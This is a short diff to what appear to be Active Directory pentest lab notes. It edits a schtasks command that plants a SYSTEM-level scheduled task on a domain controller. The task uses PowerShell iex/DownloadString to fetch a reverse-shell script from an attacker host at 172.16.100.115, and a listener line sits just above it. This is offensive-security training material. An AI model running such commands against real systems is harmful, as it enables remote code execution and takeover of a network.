@@ -403,5 +403,5 @@ Power -Reverse -IPAddress 172.16.100.115 -Port 443
 ```
 And launch this command to inject a shedule task on the host and gain a reverse shell
 ```powershell
-schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcpEx.ps1''')'"
+schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "User115" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.115/Invoke-PowerShellTcpEx.ps1''')'"
 ```
